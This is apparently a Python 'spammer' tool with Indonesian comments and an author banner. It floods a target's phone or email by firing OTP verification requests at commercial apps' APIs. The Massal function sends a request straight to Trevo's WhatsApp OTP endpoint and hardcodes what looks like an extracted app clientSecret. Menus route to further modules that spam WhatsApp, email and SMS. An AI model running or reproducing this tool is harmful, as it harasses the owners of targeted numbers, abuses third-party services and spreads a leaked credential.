import sys          #untuk fungsi pada terminal, seperti autoclick() dan exit()
import subprocess   #installing python module within code / script (tanpa requirements.txt)

try: #import Module
    import requests #POST, GET, & PUT URL API
    import time     #Untuk Informasi Waktu
    import random   #Untuk Random User
    import os       #Untuk "clear" pada terminal
    import urllib3  #Untuk HTTP Client pada python
    import json     #Agar body Request dapat dilihat dengan cara di print
    import base64   #Untuk variasi output
    import emot     #Untuk menambahkan emot
    import shutil
except ImportError:
    subprocess.check_call([sys.executable, "-m", "pip", "install", 'requests'])
    subprocess.check_call([sys.executable, "-m", "pip", "install", 'urllib3'])
    subprocess.check_call([sys.executable, "-m", "pip", "install", 'bs4'])
    subprocess.check_call([sys.executable, "-m", "pip", "install", 'colorama'])
finally:
    import requests
    import urllib3
    from colorama import Fore,Back,init
    from requests import get,post
    from urllib import request
    from bs4 import BeautifulSoup as bs

from urllib3.exceptions import *
from bs4 import BeautifulSoup as bs
from pip._vendor.requests import post,get # Bisa langsung "from requests import post,get"

# Inisialisasi Variasi Warna Output Terminal.
hijau="\033[1;92m "
putih="\033[1;97m"
abu="\033[1;90m"
kuning="\033[1;93m"
ungu="\033[1;95m"
merah="\033[1;91m"
biru="\033[1;96m"

B = Fore.BLUE
W = Fore.WHITE
R = Fore.RED
G = Fore.GREEN
BL = Fore.BLACK
Y = Fore.YELLOW

ip=requests.get('https://api.ipify.org').text
visitor=request.urlopen('https://api.countapi.xyz/hit/spammer-wa')
getvisit=json.loads(visitor.read())
localtime=time.asctime(time.localtime(time.time()))

# Function ini berfungsi sebagai pengganti print(), agar lebih menarik saat terlihat di terminal.
def autoketik(s):
    for c in s + "\n":
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(0.008)

def Massal():
    nomor = input(f"{W}[{R}• {kuning}•{hijau}•{W}] {biru}Nomor Target {W}: +62")
    trevo = requests.post("https://api-v2.trevo.my/common-users/otp/whatsapp",headers={"Host":"api-v2.trevo.my","Accept":"application/json","Cache-Control":"no-cache","X-App-Version":"3.5.3","X-App":"trevo","X-Country-Code":"ID","X-Platform":"android","X-Appsflyer-Id":"1681353044329-5958541001121242825","Content-Type":"application/json","Content-Length":"133","Accept-Encoding":"gzip, deflate","User-Agent":"okhttp/3.12.12","Connection":"close"},data=json.dumps({"clientId":"trevo","clientSecret":"gukEsPewA7aSWiboP0edr2FIb0ePhizisAwRofr4SicaFriB","language":"id","phoneNumber":"+62"+nomor})).text
    print (f"{W}[{G}✓{W}] Success Sended Spam Trevo")

autoketik(f"""

{hijau}╭━━━┳━━━┳━━━┳━╮╭━┳━╮╭━┳━━━┳━━━╮{biru}╱╭━━━┳━━━━┳━━━╮
{hijau}┃╭━╮┃╭━╮┃╭━╮┃┃╰╯┃┃┃╰╯┃┃╭━━┫╭━╮┃{biru}╱┃╭━╮┃╭╮╭╮┃╭━╮┃
{hijau}┃╰━━┫╰━╯┃┃╱┃┃╭╮╭╮┃╭╮╭╮┃╰━━┫╰━╯┃{biru}╱┃┃╱┃┣╯┃┃╰┫╰━╯┃
{hijau}╰━━╮┃╭━━┫╰━╯┃┃┃┃┃┃┃┃┃┃┃╭━━┫╭╮╭┻{biru}━┫┃╱┃┃╱┃┃╱┃╭━━╯
{hijau}┃╰━╯┃┃╱╱┃╭━╮┃┃┃┃┃┃┃┃┃┃┃╰━━┫┃┃╰┳{biru}━┫╰━╯┃╱┃┃╱┃┃
{hijau}╰━━━┻╯╱╱╰╯╱╰┻╯╰╯╰┻╯╰╯╰┻━━━┻╯╰━╯{biru}╱╰━━━╯╱╰╯╱╰╯
{abu}-----------------------------------------
{putih}[{biru}+{putih}] {biru}Author {putih}   : Tengku Arya Saputra
{putih}[{biru}+{putih}] {abu}GitHub {putih}   : AryaSec1337
{putih}[{biru}+{putih}] {merah}Team {putih}     : Dark Clown Security
{putih}[{biru}+{putih}] {ungu}Instagram {putih}: @arryyaa_17
{W}[{biru}+{W}] Ip Kamu {putih}  :{hijau} {ip}
{W}[{biru}+{W}] Waktu/Jam {putih}:{hijau} {localtime}
{W}[{biru}+{W}] Total Run {putih}:{hijau} {getvisit['value']}
""")

print(f"{W}[{R}1{W}]  SPAM WHATSAPP")
print(f"{W}[{R}2{W}]  SPAM EMAIL")
print(f"{W}[{R}3{W}]  SPAM SMS")
print(f"{W}[{R}4{W}]  SPAM MASSAL")
print(f"{W}[{R}5{W}]  Laporkan bug/Masalah 🐞")
print(f"{W}[{R}6{W}]  Info Sosmed 👨‍💻")
print("")
pilih = input(f"{W}[{R}• {kuning}•{hijau}•{W}] {biru}Pilih Menu {W}: ")

if pilih == "1":
    print("============================")
    print("\tSPAM WHATSAPP")
    print("============================")
    print(f"{W}[{R}1{W}]  Trevo")
    print(f"{W}[{R}2{W}]  Matahri")
    pilih1 = input(f"{W}[{R}• {kuning}•{hijau}•{W}] {biru}Pilih Menu Spam Whatsapp {W}: ")
    if pilih1 == "1":
        import src.trevo
    elif pilih1 == "2":
        import src.matahari
elif pilih == "2":
    print("============================")
    print("\tSPAM EMAIL")
    print("============================")
    print(f"{W}[{R}1{W}]  PizzaHut")
    print(f"{W}[{R}2{W}]  Kecipir")
    pilih1 = input(f"{W}[{R}• {kuning}•{hijau}•{W}] {biru}Pilih Menu Spam Email {W}: ")
    if pilih1 == "1":
        import src.pizzahut
    elif pilih1 == "2":
        import src.kecipir
elif pilih == "3":
    print("============================")
    print("\tSPAM SMS")
    print("============================")
    print(f"{W}[{R}1{W}]  Dekoruma")
    print(f"{W}[{R}2{W}]  Amartha")
    pilih1 = input(f"{W}[{R}• {kuning}•{hijau}•{W}] {biru}Pilih Menu Spam SMS {W}: ")
    if pilih1 == "1":
        import src.dekoruma
    elif pilih1 == "2":
        import src.amartha
elif pilih == "4":
    import src.massal
elif pilih == "5":
    print("Email: arya_alfahrezy@wearehackerone.com")
elif pilih == "6":
    print("Linkedin\t: https://www.linkedin.com/in/tengku-arya-saputra-3b5031224/")
    print("Email\t: arya_alfahrezy@wearehackerone.com")
else:
    print("Invalid Menunu")

def detekos(self):
		#remove cache
		try:
			shutil.rmtree("src/__pycache__")
		except: pass

		if os.name in ['nt','win32']:
			os.system('cls')
		else: os.system('clear')
		self.menu()